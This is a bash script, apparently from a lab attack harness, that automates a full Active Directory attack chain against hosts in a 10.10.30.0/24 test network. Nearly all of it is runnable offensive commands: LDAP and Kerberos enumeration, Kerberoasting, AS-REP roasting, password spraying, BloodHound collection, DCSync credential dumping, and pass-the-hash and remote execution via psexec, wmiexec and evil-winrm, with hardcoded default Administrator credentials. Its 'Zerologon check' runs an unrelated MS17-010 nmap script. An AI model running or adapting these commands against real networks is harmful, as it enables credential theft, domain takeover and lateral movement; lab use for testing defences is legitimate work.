#!/bin/bash
###############################################################################
# Active Directory Attack Script
# VLAN 30 targets: DC01 (10.10.30.40), WS01 (10.10.30.41)
#
# WARNING: These targets are in VLAN 30, NOT the standard VLAN 40 attack range.
# All functions validate target IPs before execution.
#
# Subtypes: ldap_enum, kerb_enum, kerberoast, asrep_roast, password_spray,
#           bloodhound, dcsync, lateral_pth, zerologon, full
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.30.40}"
TARGET_PORT="${3:-389}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"

# Source configs for AD variables
source "${SCRIPT_DIR}/configs/targets.conf" 2>/dev/null || true

DC_IP="${AD_DC_IP:-10.10.30.40}"
WS_IP="${AD_WS_IP:-10.10.30.41}"
DOMAIN="${AD_DOMAIN:-smokehouse.local}"
DOMAIN_DN="DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')"

AD_USER_FILE="${WORDLISTS_DIR}/ad_users.txt"
AD_PASS_FILE="${WORDLISTS_DIR}/ad_spray_passwords.txt"

mkdir -p "$RESULTS_DIR"

###############################################################################
# SAFETY: Validate target is in VLAN 30 (10.10.30.0/24)
###############################################################################

validate_ad_target() {
    local ip="$1"
    if [[ ! "$ip" =~ ^10\.10\.30\.[0-9]+$ ]]; then
        echo "[!] SAFETY ABORT: Target IP '$ip' is NOT in VLAN 30 (10.10.30.0/24)"
        echo "[!] AD attacks are restricted to VLAN 30 targets only."
        echo "[!] Aborting to prevent accidental attack on wrong network."
        exit 1
    fi
}

# Validate both targets on startup
validate_ad_target "$DC_IP"
validate_ad_target "$WS_IP"

echo "[*] AD attacks: $SUBTYPE"
echo "[*] DC: ${DC_IP} | WS: ${WS_IP} | Domain: ${DOMAIN}"

###############################################################################
# ATTACK FUNCTIONS
###############################################################################

run_ldap_enum() {
    echo "[*] LDAP enumeration against DC01 (${DC_IP}:389)"
    validate_ad_target "$DC_IP"

    # Nmap LDAP scripts
    echo "[*] Nmap LDAP enumeration..."
    nmap -p 389,636 --script=ldap-rootdse,ldap-search "$DC_IP" \
        -oN "${RESULTS_DIR}/nmap_ldap.txt" 2>&1 || true

    # Anonymous bind test
    if command -v ldapsearch &>/dev/null; then
        echo "[*] Anonymous LDAP bind test..."
        ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
            -s base "(objectclass=*)" \
            > "${RESULTS_DIR}/ldap_anonymous.txt" 2>&1 || true

        # User enumeration
        echo "[*] LDAP user enumeration..."
        ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
            "(objectclass=user)" sAMAccountName userPrincipalName \
            > "${RESULTS_DIR}/ldap_users.txt" 2>&1 || true

        # Group enumeration
        echo "[*] LDAP group enumeration..."
        ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
            "(objectclass=group)" cn member \
            > "${RESULTS_DIR}/ldap_groups.txt" 2>&1 || true

        # OU enumeration
        echo "[*] LDAP OU enumeration..."
        ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
            "(objectclass=organizationalUnit)" ou \
            > "${RESULTS_DIR}/ldap_ous.txt" 2>&1 || true

        # Password policy
        echo "[*] LDAP password policy query..."
        ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
            "(objectclass=domain)" lockoutDuration lockoutThreshold \
            pwdHistoryLength minPwdLength maxPwdAge minPwdAge \
            > "${RESULTS_DIR}/ldap_policy.txt" 2>&1 || true
    else
        echo "[!] ldapsearch not installed — install with: apt install ldap-utils"
    fi

    echo "[+] LDAP enumeration complete"
}

run_kerb_enum() {
    echo "[*] Kerberos user enumeration against DC01 (${DC_IP}:88)"
    validate_ad_target "$DC_IP"

    # Nmap Kerberos scripts
    echo "[*] Nmap Kerberos enumeration..."
    nmap -p 88 --script=krb5-enum-users \
        --script-args "krb5-enum-users.realm=${DOMAIN}" \
        "$DC_IP" -oN "${RESULTS_DIR}/nmap_kerberos.txt" 2>&1 || true

    # Kerbrute if available
    if command -v kerbrute &>/dev/null; then
        echo "[*] Kerbrute user enumeration..."
        kerbrute userenum \
            --dc "$DC_IP" \
            -d "$DOMAIN" \
            "$AD_USER_FILE" \
            2>&1 | tee "${RESULTS_DIR}/kerbrute_enum.txt" || true
    else
        echo "[!] kerbrute not installed — falling back to nmap only"
        nmap -p 88 --script=krb5-enum-users \
            --script-args "krb5-enum-users.realm=${DOMAIN},userdb=${AD_USER_FILE}" \
            "$DC_IP" -oN "${RESULTS_DIR}/nmap_kerb_users.txt" 2>&1 || true
    fi

    echo "[+] Kerberos enumeration complete"
}

run_kerberoast() {
    echo "[*] Kerberoasting against DC01 (${DC_IP}:88)"
    validate_ad_target "$DC_IP"

    if command -v impacket-GetUserSPNs &>/dev/null; then
        echo "[*] Requesting TGS tickets for service accounts..."
        impacket-GetUserSPNs "${DOMAIN}/" -dc-ip "$DC_IP" \
            -no-pass -request \
            2>&1 | tee "${RESULTS_DIR}/kerberoast_anon.txt" || true

        # With credentials if available
        echo "[*] Attempting with default creds..."
        impacket-GetUserSPNs "${DOMAIN}/Administrator:P@ssw0rd" \
            -dc-ip "$DC_IP" -request \
            -outputfile "${RESULTS_DIR}/kerberoast_hashes.txt" \
            2>&1 | tee "${RESULTS_DIR}/kerberoast_auth.txt" || true
    elif command -v GetUserSPNs.py &>/dev/null; then
        echo "[*] Using GetUserSPNs.py..."
        GetUserSPNs.py "${DOMAIN}/" -dc-ip "$DC_IP" \
            -no-pass -request \
            2>&1 | tee "${RESULTS_DIR}/kerberoast.txt" || true
    else
        echo "[!] impacket-GetUserSPNs not found — falling back to nmap"
        nmap -p 88 --script=krb5-enum-users \
            --script-args "krb5-enum-users.realm=${DOMAIN}" \
            "$DC_IP" -oN "${RESULTS_DIR}/nmap_kerb_spn.txt" 2>&1 || true
    fi

    echo "[+] Kerberoasting complete"
}

run_asrep_roast() {
    echo "[*] AS-REP Roasting against DC01 (${DC_IP}:88)"
    validate_ad_target "$DC_IP"

    if command -v impacket-GetNPUsers &>/dev/null; then
        echo "[*] Checking for accounts without pre-auth..."
        impacket-GetNPUsers "${DOMAIN}/" -dc-ip "$DC_IP" \
            -usersfile "$AD_USER_FILE" \
            -no-pass \
            -outputfile "${RESULTS_DIR}/asrep_hashes.txt" \
            2>&1 | tee "${RESULTS_DIR}/asrep_roast.txt" || true
    elif command -v GetNPUsers.py &>/dev/null; then
        echo "[*] Using GetNPUsers.py..."
        GetNPUsers.py "${DOMAIN}/" -dc-ip "$DC_IP" \
            -usersfile "$AD_USER_FILE" \
            -no-pass \
            -outputfile "${RESULTS_DIR}/asrep_hashes.txt" \
            2>&1 | tee "${RESULTS_DIR}/asrep_roast.txt" || true
    else
        echo "[!] impacket-GetNPUsers not found — no fallback available"
        echo "[!] Install with: pip install impacket"
    fi

    echo "[+] AS-REP Roasting complete"
}

run_password_spray() {
    echo "[*] Password spray against DC01 (${DC_IP}:445)"
    validate_ad_target "$DC_IP"

    if command -v crackmapexec &>/dev/null; then
        echo "[*] CrackMapExec password spray (5 passwords, 30s cooldown)..."
        local count=0
        while IFS= read -r password; do
            count=$((count + 1))
            if [[ $count -gt 5 ]]; then
                echo "[*] Stopped at 5 passwords to avoid lockout"
                break
            fi
            echo "[*] Spraying: ${password} (round ${count}/5)"
            crackmapexec smb "$DC_IP" \
                -u "$AD_USER_FILE" \
                -p "$password" \
                --continue-on-success \
                2>&1 | tee -a "${RESULTS_DIR}/spray_results.txt" || true
            echo "[*] Cooldown: 30 seconds..."
            sleep 30
        done < "$AD_PASS_FILE"
    else
        echo "[!] crackmapexec not installed — falling back to hydra"
        if command -v hydra &>/dev/null; then
            hydra -L "$AD_USER_FILE" \
                -P "$AD_PASS_FILE" \
                -t 2 -f -W 30 \
                "${DC_IP}" smb \
                2>&1 | tee "${RESULTS_DIR}/spray_hydra.txt" || true
        else
            echo "[!] Neither crackmapexec nor hydra available"
        fi
    fi

    echo "[+] Password spray complete"
}

run_bloodhound() {
    echo "[*] BloodHound collection against DC01 (${DC_IP})"
    validate_ad_target "$DC_IP"

    if command -v bloodhound-python &>/dev/null; then
        echo "[*] BloodHound-python collection (all methods)..."
        bloodhound-python -d "$DOMAIN" \
            -dc "$DC_IP" \
            -ns "$DC_IP" \
            -c all \
            --zip \
            2>&1 | tee "${RESULTS_DIR}/bloodhound_collection.txt" || true

        # Move output files to results dir
        mv *.json "${RESULTS_DIR}/" 2>/dev/null || true
        mv *.zip "${RESULTS_DIR}/" 2>/dev/null || true
    else
        echo "[!] bloodhound-python not installed"
        echo "[!] Install with: pip install bloodhound"
        echo "[*] Falling back to manual LDAP enumeration..."

        if command -v ldapsearch &>/dev/null; then
            # Manual domain admin enumeration
            ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
                "(&(objectclass=group)(cn=Domain Admins))" member \
                > "${RESULTS_DIR}/domain_admins.txt" 2>&1 || true

            # Service account enumeration
            ldapsearch -x -H "ldap://${DC_IP}" -b "$DOMAIN_DN" \
                "(servicePrincipalName=*)" sAMAccountName servicePrincipalName \
                > "${RESULTS_DIR}/spn_accounts.txt" 2>&1 || true
        fi
    fi

    echo "[+] BloodHound collection complete"
}

run_dcsync() {
    echo "[*] DCSync attack against DC01 (${DC_IP}:445)"
    echo "[!] WARNING: Requires Domain Admin credentials"
    validate_ad_target "$DC_IP"

    if command -v impacket-secretsdump &>/dev/null; then
        echo "[*] Attempting DCSync with default creds..."
        impacket-secretsdump "${DOMAIN}/Administrator:P@ssw0rd@${DC_IP}" \
            -just-dc-ntlm \
            -outputfile "${RESULTS_DIR}/dcsync" \
            2>&1 | tee "${RESULTS_DIR}/dcsync_output.txt" || true
    elif command -v secretsdump.py &>/dev/null; then
        echo "[*] Using secretsdump.py..."
        secretsdump.py "${DOMAIN}/Administrator:P@ssw0rd@${DC_IP}" \
            -just-dc-ntlm \
            -outputfile "${RESULTS_DIR}/dcsync" \
            2>&1 | tee "${RESULTS_DIR}/dcsync_output.txt" || true
    else
        echo "[!] impacket-secretsdump not found"
        echo "[!] Install with: pip install impacket"
    fi

    echo "[+] DCSync attempt complete"
}

run_lateral_pth() {
    echo "[*] Pass-the-Hash lateral movement to WS01 (${WS_IP}:445)"
    validate_ad_target "$WS_IP"

    local test_hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

    # PSExec
    if command -v impacket-psexec &>/dev/null; then
        echo "[*] PSExec with password..."
        impacket-psexec "${DOMAIN}/Administrator:P@ssw0rd@${WS_IP}" \
            "whoami" \
            2>&1 | tee "${RESULTS_DIR}/psexec_pass.txt" || true

        echo "[*] PSExec with hash..."
        impacket-psexec "${DOMAIN}/Administrator@${WS_IP}" \
            -hashes "$test_hash" \
            "whoami" \
            2>&1 | tee "${RESULTS_DIR}/psexec_pth.txt" || true
    elif command -v psexec.py &>/dev/null; then
        echo "[*] Using psexec.py..."
        psexec.py "${DOMAIN}/Administrator:P@ssw0rd@${WS_IP}" \
            "whoami" \
            2>&1 | tee "${RESULTS_DIR}/psexec.txt" || true
    fi

    # WMIExec
    if command -v impacket-wmiexec &>/dev/null; then
        echo "[*] WMIExec..."
        impacket-wmiexec "${DOMAIN}/Administrator:P@ssw0rd@${WS_IP}" \
            "whoami" \
            2>&1 | tee "${RESULTS_DIR}/wmiexec.txt" || true
    elif command -v wmiexec.py &>/dev/null; then
        wmiexec.py "${DOMAIN}/Administrator:P@ssw0rd@${WS_IP}" \
            "whoami" \
            2>&1 | tee "${RESULTS_DIR}/wmiexec.txt" || true
    fi

    # Evil-WinRM
    if command -v evil-winrm &>/dev/null; then
        echo "[*] Evil-WinRM to WS01..."
        timeout 15 evil-winrm -i "$WS_IP" \
            -u "Administrator" -p "P@ssw0rd" \
            -c "whoami; hostname; ipconfig" \
            2>&1 | tee "${RESULTS_DIR}/evil_winrm.txt" || true
    fi

    echo "[+] Lateral movement complete"
}

run_zerologon() {
    echo "[*] Zerologon (CVE-2020-1472) CHECK against DC01 (${DC_IP}:135)"
    echo "[!] CHECK ONLY — no exploitation attempted"
    validate_ad_target "$DC_IP"

    # Nmap check
    echo "[*] Nmap Zerologon check..."
    nmap -p 135,445 --script=smb-vuln-ms17-010 \
        "$DC_IP" -oN "${RESULTS_DIR}/nmap_zerologon.txt" 2>&1 || true

    # Impacket zerologon check (read-only)
    if command -v impacket-zerologon &>/dev/null; then
        echo "[*] Impacket Zerologon vulnerability check..."
        echo "[!] Running CHECK mode only (no password reset)"
        impacket-zerologon -check "DC01" "$DC_IP" \
            2>&1 | tee "${RESULTS_DIR}/zerologon_check.txt" || true
    else
        echo "[!] impacket-zerologon not found — RPC port scan only"
        nmap -p 135,139,445 -sV "$DC_IP" \
            -oN "${RESULTS_DIR}/nmap_rpc.txt" 2>&1 || true
    fi

    echo "[+] Zerologon check complete (no exploitation performed)"
}

###############################################################################
# MAIN DISPATCH
###############################################################################

case "$SUBTYPE" in
    ldap_enum)       run_ldap_enum ;;
    kerb_enum)       run_kerb_enum ;;
    kerberoast)      run_kerberoast ;;
    asrep_roast)     run_asrep_roast ;;
    password_spray)  run_password_spray ;;
    bloodhound)      run_bloodhound ;;
    dcsync)          run_dcsync ;;
    lateral_pth)     run_lateral_pth ;;
    zerologon)       run_zerologon ;;
    full)
        echo "[*] Full AD attack chain: enum -> roast -> spray -> bloodhound -> lateral"
        run_ldap_enum
        sleep 5
        run_kerb_enum
        sleep 5
        run_kerberoast
        sleep 5
        run_asrep_roast
        sleep 5
        run_password_spray
        sleep 5
        run_bloodhound
        sleep 5
        run_dcsync
        sleep 5
        run_lateral_pth
        sleep 5
        run_zerologon
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: ldap_enum, kerb_enum, kerberoast, asrep_roast, password_spray, bloodhound, dcsync, lateral_pth, zerologon, full"
        exit 1
        ;;
esac

echo "[*] AD attack script complete"
